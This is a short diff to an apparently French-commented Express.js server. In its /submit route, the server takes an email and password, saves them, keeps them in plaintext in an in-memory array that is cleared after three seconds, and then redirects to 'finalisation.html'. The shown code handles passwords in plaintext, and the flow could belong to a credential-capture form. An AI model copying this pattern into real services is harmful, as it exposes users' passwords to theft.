@@ -6,6 +6,9 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Variable en mémoire pour stocker temporairement les données
+let formData = [];
+
 // Middleware pour servir les fichiers statiques du dossier 'public'
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -38,6 +41,16 @@ app.post('/submit', async (req, res) => {
 
     try {
         await saveData(email, password);
+
+        // Ajouter les données au tableau formData
+        formData.push({ email, password });
+
+        // Effacer les données après 3 secondes
+        setTimeout(() => {
+            formData = [];
+            console.log('Les données ont été effacées après 3 secondes');
+        }, 3000);
+
         res.redirect('/finalisation.html');
     } catch (err) {
         console.error('Une erreur est survenue:', err);
